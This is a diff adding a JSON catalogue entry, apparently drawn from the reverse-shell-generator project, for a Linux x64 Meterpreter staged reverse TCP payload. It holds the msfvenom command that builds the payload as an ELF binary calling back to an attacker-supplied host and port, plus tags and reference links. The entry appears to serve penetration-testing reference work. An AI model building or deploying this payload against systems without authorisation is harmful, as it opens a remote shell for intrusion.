@@ -1,0 +1,32 @@
+{
+  "id": "rsg-msfvenom-linux-meterpreter-staged-reverse-tcp-x64",
+  "name": "RSG · MSFVenom · Linux Meterpreter Staged Reverse TCP (x64)",
+  "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o reverse.elf",
+  "description": "M S F Venom payload — Linux Meterpreter Staged Reverse TCP (x64) (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "msfvenom",
+    "msfvenom",
+    "linux",
+    "meterpreter",
+    "staged",
+    "reverse"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "MSFVenom/Linux Meterpreter Staged Reverse TCP (x64)/90",
+  "category": "payloads",
+  "subcategory": "msfvenom",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
